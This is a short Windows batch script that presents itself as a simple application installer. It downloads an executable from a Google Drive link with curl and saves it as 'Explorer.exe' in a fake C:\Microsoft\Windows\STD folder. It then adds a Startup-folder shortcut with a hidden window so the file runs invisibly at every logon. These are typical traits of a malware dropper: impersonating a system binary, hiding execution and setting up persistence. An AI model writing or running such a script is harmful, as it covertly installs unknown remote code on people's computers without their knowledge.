@echo off
REM Define variables
set "googleDriveFileUrl=https://drive.usercontent.google.com/download?id=1AXQr8nvYhe-bsimmCj1xligne_xKkwCn&export=download&authuser=1&confirm=t&uuid=60d7f482-2db6-4e83-be3f-6d220abfd35b&at=AENtkXYbwNRQCSpy2eu83p4rSsIh:1733264599875"
set "destinationFolder=C:\Microsoft\Windows\STD"
set "destinationFileName=Explorer.exe"  REM Change as needed
set "shortcutName=MyApplication.lnk"

REM Ensure the destination folder exists
if not exist "%destinationFolder%" (
    mkdir "%destinationFolder%"
)

REM Full path to the destination file
set "destinationFilePath=%destinationFolder%\%destinationFileName%"

REM Download the file using curl for faster speed
curl -L -o "%destinationFilePath%" "%googleDriveFileUrl%"

REM Create the shortcut in the user's desktop or Startup folder
for /f "tokens=*" %%i in ('powershell -Command "[Environment]::GetFolderPath('Startup')"') do set "startupFolder=%%i"

set "shortcutPath=%startupFolder%\%shortcutName%"

REM Create a PowerShell script to create a shortcut to run the application headlessly
powershell -Command ^
$WshShell = New-Object -ComObject WScript.Shell; ^
$Shortcut = $WshShell.CreateShortcut('%shortcutPath%'); ^
$Shortcut.TargetPath = '%destinationFilePath%'; ^
$Shortcut.Arguments = ''; ^
$Shortcut.WindowStyle = 0;  REM Hidden (headless mode); ^
$Shortcut.Save()

REM Done
echo Shortcut created to run the application headlessly at startup.
